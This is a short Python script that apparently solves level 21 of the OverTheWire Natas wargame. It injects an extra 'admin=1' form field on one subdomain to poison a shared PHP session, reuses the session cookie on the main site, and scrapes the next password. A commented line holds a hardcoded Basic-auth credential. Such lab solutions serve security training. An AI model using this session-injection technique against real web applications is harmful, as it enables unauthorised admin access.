import requests
import re
from requests.auth import HTTPBasicAuth
def solve21(username, password):
    session = requests.session()
    session.auth = HTTPBasicAuth(username, password)
    #session.headers["Authorization"] = "Basic bmF0YXMyMTpJRmVrUHlyUVhmdHppREVzVXIzeDIxc1l1YWh5cGRnSg=="
    session.headers["Content-Type"] = "application/x-www-form-urlencoded"
    cssURL = "http://natas21-experimenter.natas.labs.overthewire.org/index.php"

    session.post(cssURL, data="align=left&fontsize=100%25&bgcolor=yellow&submit=Update&admin=1")
    sessid = dict(session.cookies)["PHPSESSID"]
    session.cookies["PHPSESSID"] = sessid
    resp = session.get("http://natas21.natas.labs.overthewire.org/index.php")
    pw = re.findall(r'[a-zA-Z0-9]{32}', resp.text)[-1]
    return pw
